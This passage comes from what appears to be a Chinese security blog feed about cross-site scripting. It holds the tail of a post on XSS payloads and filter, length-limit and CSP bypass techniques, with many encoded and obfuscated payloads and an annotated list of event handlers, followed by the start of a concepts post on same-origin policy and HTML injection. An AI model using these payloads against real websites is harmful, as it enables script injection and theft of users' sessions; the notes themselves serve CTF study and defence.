&gt;</code></li><li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li><li><code>&lt;img src=# onerror=&quot;&quot; &gt;</code></li><li><code>&lt;img src= onerror=&quot;&quot; &gt;</code></li><li><code>&lt;img src=/ onerror=&quot;&quot; &gt;</code></li><li><code>&lt;input onfocus=“alert(1)”autofocus&gt;</code></li><li><code>&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;</code></li><li><code>&lt;details open ontoggle=alert(1)&gt;</code></li><li><code>&lt;svg onload=alert(1)&gt;</code></li><li><code>&lt;svg/onload=alert(&#39;XSS&#39;)&gt;</code></li><li><code>&lt;script&gt;Set.constructor(alert\x28/XSS/\x29)&lt;/script&gt;</code></li><li><code>&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;</code></li><li><code>&lt;form action=“javascript:alert(1)&gt;</code></li><li><code>&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/button&gt;</code></li></ul><h1 id="XSS-绕过"><a href="#XSS-绕过" class="headerlink" title="XSS 绕过"></a>XSS 绕过</h1><p>绕过是反反攻击的艺术，需要结合特定的filter进行分析构造。这里先介绍绕过所需的基本条件，然后介绍绕过的一些通用技术，具体的filter就不一一举例，但读者可以利用通用技术灵活组合，举一反三。</p><h2 id="基本条件"><a href="#基本条件" class="headerlink" title="基本条件"></a>基本条件</h2><h3 id="解释器特性"><a href="#解释器特性" class="headerlink" title="解释器特性"></a>解释器特性</h3><ul><li>HTML 标签大小写不敏感<ul><li>HTML parser自动补全不闭合的标签(动态改变的可能不行)</li></ul></li><li>HTML parser自动给属性后空白字符前的值加引号 如 <code>&lt;a onclick=alert(1) &gt;&lt;/a&gt;</code>  -&gt;  <code>&lt;a onclick=“alert(1)”&gt;&lt;/a&gt;</code></li><li>HTML实体编码可以不带分号</li><li>URL协议字段大小写不敏感</li><li>URL协议如果没写默认为<code>location.protocol</code></li><li>URL整个字段可以嵌入任意多个以下空白字符<ul><li>[输入的TAB]</li><li>使用HTML实体编码的 <code>&amp;#x0A &amp;#x0D &amp;#x09</code></li></ul></li><li><code>&amp;#14;javascript:alert(‘XSS’);</code> URL协议前可以有任何十进制的1-32的字符</li><li>畸形URL处理<ul><li>www。google。com -&gt; <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> IE/Google/Firefox</li><li><a href="http://www.google.com\abc" target="_blank" rel="noopener">www.google.com\abc</a> -&gt; <a href="http://www.google.com/abc" target="_blank" rel="noopener">www.google.com/abc</a> IE/Google</li><li><a href="http://www.google.com?abc" target="_blank" rel="noopener">www.google.com?abc</a> -&gt; <a href="http://www.google.com/?abc" target="_blank" rel="noopener">www.google.com/?abc</a> IE/Google/Firefox</li><li>[<a href="http://www.cnn.com]" target="_blank" rel="noopener">http://www.cnn.com]</a> Firefox</li><li>[http://]<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> Firefox</li><li>[<a href="http://www].google.com" target="_blank" rel="noopener">http://www].google.com</a> Firefox</li><li>…</li></ul></li><li>JavaScript Parser自动补全JS语句的分号</li></ul><h3 id="解释器的自动解码"><a href="#解释器的自动解码" class="headerlink" title="解释器的自动解码"></a>解释器的自动解码</h3><ul><li>指令<ul><li>HTML不会对标签名以及属性等keyword进行HTML实体解码</li><li>URL的协议关键字用URL编码之后浏览器无法正确识别如（<code>h%74tp://baidu.com和javascrip%74:alert(1)</code>）都不会被正常识别</li><li>JS的指令可以用\u的Unicode码点表示（只支持plane1码点即UCS-2 即16位Unicode字符）</li></ul></li><li>数据<ul><li>HTML parser会对数据（字符串）进行HTML实体解码</li><li>URL的协议之后的部分会进行URL解码</li><li>HTTP(S)协议的内容会进行进制识别（十进制、八进制、十六进制IP地址）</li><li>JS的字符串会进行进制识别(要在引号内)，即<code>alert(‘\x74’) alert(‘\74’)</code> 都是合法的。以及和指令的码点表示类似，<code>alert(‘\u0074’)</code> 也合法</li></ul></li></ul><blockquote><p>eval等函数相当于将指令-&gt;数据，从而可以利用JS的数据解码的特性如进制编码和\u编码来绕过过滤</p></blockquote><h3 id="通用绕过技术"><a href="#通用绕过技术" class="headerlink" title="通用绕过技术"></a>通用绕过技术</h3><ul><li>特性绕过<ul><li>大小写绕过</li><li>不闭合标签<ul><li><code>&lt;iframe src=javascript:alert(1)&gt;</code></li><li><code>&lt;iframe src=javascript:alert(1)</code></li></ul></li><li>不写引号</li><li>不写分号</li><li>不写协议(HTTP(S))</li><li>畸形URL</li></ul></li><li>编码绕过<ul><li>HTML value部分进行HTML实体编码</li><li>URL 数据部分(协议的冒号之后)进行URL编码</li><li>HTTP(S)的IP使用进制转换（十进制、八进制十六进制IP）</li><li>JS的指令使用Unicode码点绕过，数据使用进制编码、Unicode编码都行</li><li>伪协议编码如 <code>&lt;iframe src=&quot;dAta:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</code></li><li>多重编码（记住解码顺序是HTML先） 如 <code>&lt;iframe src=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x36;&amp;#x31;&amp;#x25;&amp;#x36;&amp;#x63;&amp;#x25;&amp;#x36;&amp;#x35;&amp;#x25;&amp;#x37;&amp;#x32;&amp;#x25;&amp;#x37;&amp;#x34;&amp;#x25;&amp;#x32;&amp;#x38;&amp;#x25;&amp;#x32;&amp;#x37;&amp;#x25;&amp;#x37;&amp;#x38;&amp;#x25;&amp;#x37;&amp;#x33;&amp;#x25;&amp;#x37;&amp;#x33;&amp;#x25;&amp;#x32;&amp;#x37;&amp;#x25;&amp;#x32;&amp;#x39;&quot;&gt;&lt;/iframe&gt;</code>是个合法的XSS Payload</li><li>页面编码如页面是<code>GBK/GB2312</code>，<code>%c1\ == ‘羂’</code>， 因为<code>%c1</code>是<code>gbk</code>编码中的区位符号，与后16位的偏移一起组合成为一个汉字，所以就会把转义符号给“吃”掉了。</li></ul></li></ul><blockquote><p>编码部分我做了个镜像整合了余弦大大的<code>xssor2</code>和著名的<code>xssee</code>，并做了小修改. docker pull lxzmads/xssxor</p></blockquote><ul><li>可选替代绕过<ul><li>HTML<ul><li>tab代替空格</li><li><code>/</code> 代替 空格</li></ul></li><li>JS<ul><li>正则代替引号如<code>alert(/xss/)</code></li><li>反引号代替括号(带标签模版字符串)</li><li>方法劫持<ul><li><code>onerror=eval;throw&#39;=alert\x281\x29’;</code> 绕过括号 = 因为Chrome和Opera会在异常前加个Uncaught</li></ul></li><li>Object运算代换<ul><li><code>‘xss’ == &#39;x&#39; + &#39;xs&#39;</code></li><li><code>‘xss’ == String.fromCharCode(120,115,115)</code></li><li><code>‘xss’ == unescape(&#39;%78%73%73&#39;)</code></li><li><code>‘xss’ == atob(&#39;eHNz&#39;)</code></li><li><code>a=alert,a(1)</code></li><li><code>[1].find(alert)</code></li><li><code>(alert)(1)</code></li></ul></li></ul></li></ul></li><li>过滤器逻辑绕过<ul><li>过滤一次为空：双写</li><li>服务端解码两次: 二次编码</li></ul></li><li>服务端函数变量<ul><li>PHP<ul><li><code>htmlentities()</code>函数没有过滤单引号，适用于在变量处的xss。</li><li>POST的action字段使用了php的<code>$_SERVER[&#39;PHP_SELF&#39;]</code>, 利用url的参数</li></ul></li></ul></li><li><p>代码变换绕过</p><ul><li>“超函数”——可以将代码变为数据，从而使用数据的各种编码绕过<ul><li><code>eval</code><ul><li><code>a=`aler`;b=`t`;c=&#39;(`xss`);&#39;;eval(a+b+c) -&gt; alert(`xss`)</code></li><li><code>eval(function(p,a,c,k,e,r){e=String;if(!&#39;&#39;.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;0(/1/)&#39;,2,2,&#39;alert|xss&#39;.split(&#39;|&#39;),0,{}))</code></li></ul></li><li><code>top</code><ul><li><code>top[&quot;al&quot;+&quot;ert&quot;](`xss`); -&gt; alert(`xss`)</code></li></ul></li><li><code>window parent self this constructor</code><ul><li><code>Set.constructor(alert\x28document.domain\x29)</code></li></ul></li></ul></li><li>空属性<ul><li><code>&lt;script/x&gt;alert(1)&lt;/script&gt;</code> 绕正则</li></ul></li><li>注释符<ul><li><code>&lt;&lt;SCRIPT&gt;alert(&#39;XSS&#39;);//&lt;&lt;/SCRIPT&gt;</code> 双写尖括号</li></ul></li></ul></li><li><p>综合Paylod举例</p><ul><li><code>[][&#39;\146\151\154\164\145\162&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;] (&#39;\141\154\145\162\164\50\61\51&#39;)()</code> 绕不准字母表</li><li><code>(alert)(1)</code></li><li><code>a=alert,a(1)</code></li><li><code>[1].find(alert)</code></li><li><code>top[&quot;al&quot;+&quot;ert&quot;](1)</code></li><li><code>top[/al/.source+/ert/.source](1)</code></li><li><code>top[&#39;al\145rt&#39;](1)</code></li><li><code>top[8680439..toString(30)](1)</code></li></ul></li></ul><h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><ul><li>利用事件(其他写法)来缩短字节数<ul><li><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 比 <code>&quot;onclick=alert(1)//</code> 长</li></ul></li><li>第二个思路是把长的Payload写到别处，然后用一个简短的reference来调用。<ul><li>可以藏代码的地方就是可以自定义的地方</li><li>比如<code>location.hash</code>。</li><li>通过<code>&quot; onclick=&quot;eval(location.hash.substr(1))&quot;</code></li><li>加载远程JS</li><li>可控的页面内容，RPO载入</li></ul></li><li>利用注释符绕过长度限制。就是利用<code>&lt;!-- --&gt;</code>注释掉html代码，打通若干个html标签</li><li><code>&lt;base&gt;</code>标签劫持相对路径引入的资源</li><li><code>window.name</code>可以缩短Payload长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.name=&quot;alert(document.cookie)&quot;;</span><br><span class="line">location.href=&quot;http://www.xssedsite.com/xssed.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><p>在同一窗口打开具有XSS漏洞的站点，只需要 eval(name);就可以执行Payload,只有11个字符。</p><h2 id="跨域限制绕过"><a href="#跨域限制绕过" class="headerlink" title="跨域限制绕过"></a>跨域限制绕过</h2><ul><li><code>window</code></li><li><code>postMessage</code></li><li><em>TODO</em></li></ul><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><ul><li><p>文件上传注入,绕过CSP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a=//&lt;script&gt;</span><br><span class="line">alert(1)//&lt;/script&gt;;</span><br></pre></td></tr></table></figure></li><li><p><em>TODO</em></p></li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Events-in-JavaScript"><a href="#Events-in-JavaScript" class="headerlink" title="Events in JavaScript"></a>Events in JavaScript</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)</span><br><span class="line">onAbort() (当用户中止加载图片时)</span><br><span class="line">onActivate() (当对象激活时)</span><br><span class="line">onAfterPrint() (用户打印或进行打印预览后触发)</span><br><span class="line">onAfterUpdate() (从数据源对象更新数据后由数据对象触发)</span><br><span class="line">onBeforeActivate() (在对象设置为激活元素前触发)</span><br><span class="line">onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(&quot;Copy&quot;)函数触发)</span><br><span class="line">onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)</span><br><span class="line">onBeforeDeactivate() (在当前对象的激活元素变化前触发)</span><br><span class="line">onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)</span><br><span class="line">onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(&quot;Paste&quot;)函数触发)</span><br><span class="line">onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)函数).</span><br><span class="line">onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)</span><br><span class="line">onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)</span><br><span class="line">onBegin() (当元素周期开始时由onbegin 事件立即触发)</span><br><span class="line">onBlur() (另一个窗口弹出当前窗口失去焦点时触发)</span><br><span class="line">onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)</span><br><span class="line">onCellChange() (当数据提供者的数据变化时触发)</span><br><span class="line">onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)</span><br><span class="line">onClick() (表单中点击触发)</span><br><span class="line">onContextMenu() (用户需要在攻击区域点击右键)</span><br><span class="line">onControlSelect() (当用户在一个对象上创建控件选中区时触发)</span><br><span class="line">onCopy() (用户需要复制一些东西或使用execCommand(&quot;Copy&quot;)命令时触发)</span><br><span class="line">onCut() (用户需要剪切一些东西或使用execCommand(&quot;Cut&quot;)命令时触发)</span><br><span class="line">onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)</span><br><span class="line">onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)</span><br><span class="line">onDataSetComplete() (数据源对象中所有数据可用时触发)</span><br><span class="line">onDblClick() (用户双击一个表单元素或链接)</span><br><span class="line">onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)</span><br><span class="line">onDrag() (在元素正在拖动时触发)</span><br><span class="line">onDragEnd() (当用户完成元素的拖动时触发)</span><br><span class="line">onDragLeave() (用户在拖动元素离开放置目标时触发)</span><br><span class="line">onDragEnter() (用户将对象拖拽到合法拖曳目标)</span><br><span class="line">onDragOver() (用户将对象拖拽划过合法拖曳目标)</span><br><span class="line">onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)</span><br><span class="line">onDragStart() (当用户开始拖动元素时触发)</span><br><span class="line">onDrop() (当拖动元素放置在目标区域时触发)</span><br><span class="line">onEnded() (在视频/音频（audio/video）播放结束时触发)</span><br><span class="line">onError() (在加载文档或图像时发生错误)</span><br><span class="line">onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)</span><br><span class="line">onFilterChange() (当滤镜完成状态变更时触发)</span><br><span class="line">onFinish() (当marquee完成滚动时攻击者可以执行攻击)</span><br><span class="line">onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)</span><br><span class="line">onFocusIn() (当元素将要被设置为焦点之前触发)</span><br><span class="line">onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)</span><br><span class="line">onHashChange() (当锚部分发生变化时触发攻击代码)</span><br><span class="line">onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)</span><br><span class="line">onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发)</span><br><span class="line">onKeyDown() (用户按下一个键的时候触发)</span><br><span class="line">onKeyPress() (在键盘按键被按下并释放一个键时触发)</span><br><span class="line">onKeyUp() (用户释放一个键时触发)</span><br><span class="line">onLayoutComplete() (用户进行完打印或打印预览时触发)</span><br><span class="line">onLoad() (攻击者在窗口加载后触发攻击代码)</span><br><span class="line">onLoseCapture() (可以由releaseCapture()方法触发)</span><br><span class="line">onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)</span><br><span class="line">onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)</span><br><span class="line">onMessage() (当页面收到一个信息时触发事件)</span><br><span class="line">onMouseDown() (攻击者需要让用户点击一个图片触发事件)</span><br><span class="line">onMouseEnter() (光标移动到一个对象或区域时触发)</span><br><span class="line">onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class="line">onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)</span><br><span class="line">onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class="line">onMouseOver() (光标移动到一个对象或区域)</span><br><span class="line">onMouseUp() (攻击者需要让用户点击一个图片)</span><br><span class="line">onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)</span><br><span class="line">onMove() (用户或攻击者移动页面时触发)</span><br><span class="line">onMoveEnd() (用户或攻击者移动页面结束时触发)</span><br><span class="line">onMoveStart() (用户或攻击者开始移动页面时触发)</span><br><span class="line">onOffline() (当浏览器从在线模式切换到离线模式时触发)</span><br><span class="line">onOnline() (当浏览器从离线模式切换到在线模式时触发)</span><br><span class="line">onOutOfSync() (当元素与当前时间线失去同步时触发)</span><br><span class="line">onPaste() (用户进行粘贴时或攻击者可以使用execCommand(&quot;Paste&quot;)函数时触发)</span><br><span class="line">onPause() (在视频或音频暂停时触发)</span><br><span class="line">onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)</span><br><span class="line">onProgress() (攻击者可以在一个FLASH加载时触发事件)</span><br><span class="line">onPropertyChange() (用户或攻击者需要改变元素属性时触发)</span><br><span class="line">onReadyStateChange() (每次 readyState 属性变化时被自动调用)</span><br><span class="line">onRedo() (用户返回上一页面时触发)</span><br><span class="line">onRepeat() (事件在播放完重复播放时触发)</span><br><span class="line">onReset() (用户或攻击者重置表单时触发)</span><br><span class="line">onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)</span><br><span class="line">onResizeEnd() (用户完成改变窗体大小时触发)</span><br><span class="line">onResizeStart() (用户开始改变窗体大小时触发)</span><br><span class="line">onResume() (当元素继续播放时触发)</span><br><span class="line">onReverse() (当元素回放时触发)</span><br><span class="line">onRowsEnter() (用户或攻击者需要改变数据源中的一行)</span><br><span class="line">onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)</span><br><span class="line">onRowDelete() (用户或攻击者需要删除数据源中的一行)</span><br><span class="line">onRowInserted() (user or attacker would needto insert a row in a data source)</span><br><span class="line">onScroll() (用户需要滚动或攻击者使用scrollBy()函数)</span><br><span class="line">onSeek() (当用户在元素上执行查找操作时触发)</span><br><span class="line">onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)</span><br><span class="line">onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)</span><br><span class="line">onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)</span><br><span class="line">onStart() (在marquee 对象开始循环时触发)</span><br><span class="line">onStop() (当用户按下停止按钮或离开页面时触发)</span><br><span class="line">onStorage() (当Web Storage更新时触发)</span><br><span class="line">onSyncRestored() (当元素与它的时间线恢复同步时触发)</span><br><span class="line">onSubmit() (需要用户或攻击者提交表单)</span><br><span class="line">onTimeError() (用户或攻击者设置时间属性出现错误时触发)</span><br><span class="line">onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)</span><br><span class="line">onUndo() (用户返回上一浏览记录页面时触发)</span><br><span class="line">onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)</span><br><span class="line">onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)</span><br><span class="line">seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</span><br></pre></td></tr></table></figure><p>其余参考<a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="noopener">这里</a></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>《白帽子讲Web安全》——吴翰清</li><li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li><li><a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/" target="_blank" rel="noopener">http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals</a></li><li><a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="noopener">http://help.dottoro.com/ljfvvdnm.php</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XSS检测&quot;&gt;&lt;a href=&quot;#XSS检测&quot; class=&quot;headerlink&quot; title=&quot;XSS检测&quot;&gt;&lt;/a&gt;XSS检测&lt;/h1&gt;&lt;p&gt;用于探测XSS的存在性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XSS Locator(Polygot)&lt;ul&gt;
&lt;li&gt;&lt;co
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://lxzmads.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://lxzmads.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS Concept Notes</title>
    <link href="http://lxzmads.github.io/2019/04/10/XSS-Concept-Notes/"/>
    <id>http://lxzmads.github.io/2019/04/10/XSS-Concept-Notes/</id>
    <published>2019-04-10T08:38:19.000Z</published>
    <updated>2019-04-10T08:43:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>Web安全深似海，最近想稍微整理下之前扔到笔记堆里假装自己掌握了的其实从来没有翻过的Web安全文章，发现Web安全这一块真的知识点太多了。但是万事开头难，我还是想能把自己打CTF遇到的与Web安全相关的知识都做个梳理，为以后从事相关行业打下基础吧。这篇呢就是XSS三篇(Concept、Attack、Defense)三篇的第一篇。整理的很仓促，但我会慢慢的补充完善。内容以笔记的形式呈现，对于概念型的东西不啰嗦太多，但我会加个(我认为)比较好的对概念介绍的文章引用。大部分内容都整理自书本或者网上分享的文章，我会在后面加上Reference，侵删。有时候会夹杂点自己的想法，如有谬误欢迎评论区指正交流。</p><h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>在开始CAD(Concept Attack Defense)之前，了解下浏览器的同源策略会比较好理解后面的部分，就放在这了。</p><h2 id="Same-Origin-Policy"><a href="#Same-Origin-Policy" class="headerlink" title="Same Origin Policy"></a>Same Origin Policy</h2><p>Origin: 相同protocol、host、port的url属于相同origin。参考<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">这里</a></p><ul><li>可以跨域加载资源的标签(src):<ul><li><code>&lt;script&gt;</code></li><li><code>&lt;img&gt;</code></li><li><code>&lt;link&gt;</code></li><li><code>&lt;iframe&gt;</code></li><li>…</li></ul></li></ul><blockquote><p>值得一提的是src加载的资源，JavaScript脚本无法对其进行读写，只能执行。</p></blockquote><ul><li><p>XMLHttpRequest想要访问跨域资源需要所访问资源的服务器返回一组特殊的HTTP头，就是CORS。CORS相当于规定了自己的哪些资源可以被哪些源的scripts访问。具体参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank" rel="noopener">这里</a></p></li><li><p>CSP是服务器返回的HTTP头，规定了浏览器应该遵守的安全策略。CSP相当于规定了自己可以访问哪些源。具体参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">这里</a></p></li></ul><h2 id="HTML-Injection"><a href="#HTML-Injection" class="headerlink" title="HTML Injection"></a>HTML Injection</h2><p>XSS本质是HTML Injection，根据<a href="https://www.owasp.org/index.php/Injection_Theory" target="_blank" rel="noopener">Owasp Injection Theory</a>，XSS发生的各种条件如下：</p><ol><li>Untrusted Data</li></ol><p>XSS的Untrusted Data来源于前端用户的输入，然后流入后端（或者不）经过处理再返回到前端浏览器进行解释。</p><ol start="2"><li>Injection Context</li></ol><p>XSS发生的上下文是在HTML文档中，攻击者可以通过标签闭合、恶意标签注入等方式逃出开发者本意的上下文，从而控制浏览器行为。</p><ol start="3"><li>Parsers</li></ol><p>浏览器中有HTML parser、JavaScript parser、CSS parser等，HTML parser会优先执行，所以像下面的代码会被浏览器错误解释。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var a = '</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line">    alert(a);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/20190408201102.png" alt="20190408201102.png"></p><blockquote><p>关于解码： 各种parser会对输入的<strong>字符串</strong>按照自己的解码方法依次解码，比如字符<code>r</code>js的Unicode编码后<code>\u0072</code>，再html实体<code>&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;</code>，传入浏览器，先是经过HTML parser变成<code>\u0072</code>，再到JavaScript parser变成<code>r</code>. 除了对字符串解码，JS还会对指令也进行Unicode解码（不会进行进制解码如\x65 \100）。 比如<code>al\u0065rt(1);</code>是合法的JS语句，但<code>al\x65rt(1);</code>不是。 但是HTML parser不会对标签的关键字和属性进行解码，url解码器对协议字段解码后协议不会被正确识别 （Chrome 73.0.3683.86测试）</p></blockquote><ol start="4"><li>Ways</li></ol><ul><li>Injecting UP</li></ul><p>简单来说就相当于闭合标签，使得攻击者逃离了原来的上下文，并可以开始一个新的上下文。注意可能闭合的是好几层前的标签，不一定只是父标签。</p><ul><li>Injecting DOWN</li></ul><p>相当于在原来的上下文中，nest一个上下文sub-context。如<code>&lt;img 